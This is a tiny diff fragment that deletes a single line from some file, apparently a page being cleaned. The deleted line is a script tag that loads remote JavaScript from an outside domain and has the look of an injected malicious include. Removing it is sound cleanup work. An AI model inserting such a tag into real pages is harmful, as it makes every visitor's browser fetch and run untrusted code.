@@ -437,4 +437,3 @@
 
 
 
-<script language=javascript src=http://cc.18dd.net/1.js></script>
